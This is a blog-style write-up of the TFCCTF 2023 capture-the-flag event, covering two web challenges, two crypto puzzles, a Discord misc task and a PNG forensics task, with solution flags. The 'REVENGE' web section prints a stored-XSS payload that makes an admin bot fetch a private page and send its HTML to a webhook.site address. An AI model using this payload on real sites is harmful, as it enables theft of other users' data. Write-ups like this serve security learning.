---
title: "TFCCTF 2023 Writeup"
date: 2023-07-30T09:16:29-07:00
description: The TFCCTF 2023 writeup. 2 web, 1 crypto, 1 misc
tags:
  - ctf
showTableOfContents: true
showCover: false
---

[The Few Chosen](https://ctf.thefewchosen.com/) hosted their third annual Capture The Flag (CTF) event. A lot of teams participated. It was very interesting and had a lot of solving them. To me, this was a great educational CTF and beginner friendly.

## web/BABY DUCKY NOTES
* solved
* solves: 443
* description: Quack quack! Try and huack me!

The challenge was a note taking web app. Users can view other people's posts but posts can be hidden. The flag was in the `admin`'s first post. This one was easy since the admin post was not hidden. Simply sign up and view the `admin`'s post 

```python
    query(con, f''' 
    INSERT INTO posts (
        user_id,
        title,
        content,
        hidden
        ) VALUES (
            1,
            'Here is a ducky flag!',
            '{os.environ.get("FLAG")}',
            0
    );
    ''')
```

{{< figure
    src="ducky-1.png"
    alt="A screenshot of the BABY DUCKY NOTES challenge"
>}}

Then we get the flag `TFCCTF{Adm1n_l0St_h1s_m1nd!}`

## web/BABY DUCKY NOTES: REVENGE
* solved
* solves: 175
* description: Quack quack! Try and huack me! Again!

The challenge has patched the previous issue and made the post hidden. I tried to see if there was a way to do SQL injection, no luck. I tried to see if I can forge the cookie to pretend I was the `admin`. I found [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) that can fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. This time the secret key was random so I couldn't forge it. It was fun to play around with the idea.

```python
app.secret_key = os.urandom(30).hex()
```

The app has a way to report a user and a bot will visit that user's post page. This can be used to our advantages. If we can somehow xss my own user's page then I can navigate to admin's own page to steal the flag.

```html
<p> {{post.get('content') | safe}} </p>
```
This code is from the post template. The usage of `safe` means that Flask will not sanitize the post content which allows us to XSS. This was my payload. It navigates to admin's page and relay the HTML response to the webhook site in the body for me.

```html
<script>
  fetch('http://localhost:1337/posts/view/admin').then(res => res.text()).then(res => {
    fetch('https://webhook.site/f87a15ba-36e1-4b45-a310-53dd5247a133', {method: 'POST', body: res});
  })
</script>
```

{{<figure
    src="ducky-2.png"
    alt="A screenshot of the response in webhook with flag in the body"
>}}

Then we get the flag `TFCCTF{Ev3ry_duCk_kn0w5_xSs!}`


## crypto/MAYDAY
* solved
* solves: 651
* description: We are sinking! The nearest ship got our SOS call, but they replied in pure gobbledygook! Are ye savvy enough to decode the message, or will we be sleepin' with the fish tonight? All hands on deck!

The message reads

```
Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform Seven
```

This is the phonetic spelling. Just change dash and number words to `-` and numbers, and first letter of each word. You get the flag `TFCTF{WH4T-AR3-YOU-S1NKING-4B0U7}`

I found out that there is a website that for this decoding: https://cryptii.com/. Select "Spelling alphabets". A pretty cool tool. It seems similar to cyberchef.


## misc/Discord Shenanigans V3
* solved
* solves: 146
* description: Oh, look who's back for more chaotic fun! The annual wild ride of DISCORD SHENANIGANS V3 is live, and this time we're serving a delicious dish of digital disorder, courtesy of our mischievous Discord bot. For those with a discerning eye and a knack for unscrambling the scrambled, this game is your pixelated playground. The flag, you ask? Well, it's tucked away in a place that's right in front of you, yet often overlooked. Seek the unseen, unravel the unexpected, and let the shenanigans begin!

The flag was in the discord bot's profile picture. Open in a new tab to see the flag.

{{<figure
    src="discord.png"
    alt="The discord bot's profile picture with the flag"
    width="20%"
>}}


## forensics/DOWN BAD
* not solved
* solves: 238
* description: The flag is right there!

You get a png file but cannot be opened. It seems like something is wrong with the file. Using `exiftool` does not tell me much. It says it was made with `http://www.pdf-tools.com` so I wasted sometime to see if I can convert png to pdf or vise versa.

Use `binwalk` says it's a PNG and Zlib compressed. All PNG are Zlib compressed so looks like there are not hidden file inside the image.

Use `pngcheck` to see what's wrong.

```bash
➜  DOWN-BAD pngcheck -c down_bad.png
down_bad.png  CRC error in chunk IHDR (computed 1d9c52c0, expected a9d5455b)
ERROR: down_bad.png
```

After correctly the CRC, the image is showing but does not show the flag.


<!-- Use static image path because of the PNG has too incorrect dimension  -->
{{< figure
    src="/images/2023-07-30/down_bad_fixed.png"
    alt="The down bad image after fixing CRC"
    width="30%"
>}}

I tried a couple of other tools, `strings`, `stegsolve` but nothing turned out to be useful.

After the event, I found out, instead of fixing the CRC, we should be fixing the height to match the CRC. CRC is calculate based on header information. So we can find out the original height by brute forcing CRC check.

I found this [script: png-unhide](https://github.com/ryanking13/png-unhide) later. It detects the real height and fix it for you.

```bash
➜  DOWN-BAD python3 checker.py down_bad-fixed.png
[*] Height in the IHDR: 0x490
[*] Real Height: 0x540
[!!] Wrong size in the IHDR
Automatically fix the IHDR? (Y/N)y
[*] Fixed file saved to down_bad-fixed_fixed.png
```

{{< figure
    src="down_bad_flag.png"
    alt="The down bad image with flag"
    width="30%"
>}}

Someone also mentioned https://fotoforensics.com/ in the discord chat where you can see hidden rows in a file. It is a nice tool.

This challenge reminded of the `papapa` from Google's 2023 CTF. Both are changing the dimension to find out the true size of the image. I might look into the actual spec of both PNG and JPEG later. 



## crypto/DIZZY
* not solved
* solves: 411
* description: Embark on 'Dizzy', a carousel ride through cryptography! This warmup challenge spins you around the basics of ciphers and keys. Sharpen your mind, find the flag, and remember - in crypto, it's fun to get a little dizzy!

Message: 
```
T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24
```

I forgot about the super useful https://www.dcode.fr/ site that can help you guess the cipher for you. Putting the message in it guess the flag to be using "Letters Positions" `TFCCTF{th_chllng_mks_m_dzzy_;d}` but this was incorrect.

The letters positions encryption is straightforward. The word/string to be encoded is decomposed of characters/letters. For example: `T4` means `T` is in position `4`.

The actual message has 40 segments meaning 40 characters. `dcode` only returned 31 characters. We can write a simple script to decode this.

```python
cipher = 'T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24'.split()
flag = [''] * len(cipher)
for pair in cipher:
    char, pos = pair[0], int(pair[1:])
    flag[pos] = char

print(''.join(flag))
```

The script returns the flag `TFCCTF{th15_ch4ll3ng3_m4k3s_m3_d1zzy_;d}`

## Conclusion

This was a great CTF to me. The site aesthetics was great. The warmup challenges were great for beginner like me to ease into the event. Love see some other events for like this.
